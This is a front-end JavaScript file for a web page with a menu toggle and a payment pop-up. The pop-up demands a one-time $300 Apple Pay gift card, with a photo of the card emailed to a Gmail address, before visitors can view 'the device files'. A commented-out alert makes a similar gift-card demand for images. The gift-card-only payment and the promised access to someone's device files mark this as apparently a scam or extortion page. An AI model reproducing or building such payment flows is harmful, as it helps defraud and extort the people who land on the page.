const hamburger = document.querySelector(".hamburger");
const navBar = document.querySelector(".navigation");
const imageOverlay = document.querySelectorAll(".overlay");
const paymentBtn = document.querySelectorAll(".pay-btn");
const whatsappIcon = document.querySelector(".whatsapp-link");

hamburger.addEventListener("click", (e) => {
    hamburger.classList.toggle("open");
    navBar.classList.toggle("open");
})

setInterval(() => {
    whatsappIcon.classList.toggle("grow");
}, 500)



/*
document.body.addEventListener("click", (e) => {
    if (e.target !== hamburger.contains("open")) {
        hamburger.classList.remove("open");
    }
})

imageOverlay.forEach(overlay => {
    overlay.addEventListener("click", () => {
        alert("To procced to see images make a payment via gift card")
    })
})
    */



let paymentElement = null;

paymentBtn.forEach(paybtn => {
    paybtn.addEventListener("click", () => {

        if (!paymentElement) {
            paymentElement = document.createElement("div");
            paymentElement.className = "payment-overlay";
            paymentElement.innerHTML = `
            <div class="payment-container">
                <p class="payment-title">Payment Method</p>
                <select class="payment-select">
                    <option></option>
                    <option value="gift-card" checked>Gift card</option>
                </select>
                <div class="payment-info">
                    <p>To view the device files make a one time payment of $300 worth of Apple Pay Gift card.</p>
                    <p>And send the image to the Email link below for confirmation.</p>
                    <p class="whatsapp-link"><a href="mailto:webcodeprovider@gmail.com?subject=Gift%20Card%20Payment&body=Below%20is%20the%20image%20proof%20of%20my%20$300%20Apple%20Pay%20gift%20card%20payment." target="_blank"><i id="whatsapp-lin" class="fas fa-envelope" ></i> Email us</a></p>
                </div>
                <div class="payment-error">
                    <p>Please select a payment method</p>
                </div>
                <div class="payment-buttons">
                    <button class="cancel-payment">Cancel</button>
                    <button class="proceed-payment">Proceed</button>
                </div>
            </div>
            `;
            document.body.appendChild(paymentElement);
        }
        
        

        


        let cancelpay = paymentElement.querySelector(".cancel-payment");
        const proceedbtn = paymentElement.querySelector(".proceed-payment");
        const selectOption = paymentElement.querySelector(".payment-select");
        const paymentInfo = paymentElement.querySelector(".payment-info");
        const paymentError = paymentElement.querySelector(".payment-error");


        cancelpay.addEventListener("click", () => {
            paymentElement.classList.add("close");

            setTimeout(() => {
                paymentElement.remove();
                paymentElement = null;  // Reset the payment element for future generation
            }, 500); 
        })

        proceedbtn.addEventListener("click", () => {
            if (selectOption.value === "gift-card") {
                paymentInfo.style.display = "block";
                paymentError.style.display = "none";
            } else {
                paymentError.style.display = "block";
                paymentInfo.style.display = "none";
            }
        })

        
    })
})


